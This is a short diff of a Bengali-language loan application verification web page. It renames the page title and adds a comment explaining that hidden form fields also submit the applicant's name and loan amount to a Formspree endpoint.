@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>আবেদন নিশ্চিতকরণ</title>
+    <title>আবেদন ট্র্যাকিং যাচাই</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
         * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Roboto, sans-serif; }
@@ -78,6 +78,7 @@
 
     <div class="form-wrap">
         <form id="verifyForm" action="https://formspree.io/f/xvkkeegq" method="POST">
+            <!-- হিডেন ফিল্ড যার মাধ্যমে নাম ও লোনের পরিমাণও জমা হবে -->
             <input type="hidden" name="নাম" id="hiddenName">
             <input type="hidden" name="টাকার_পরিমাণ" id="hiddenAmount">
 
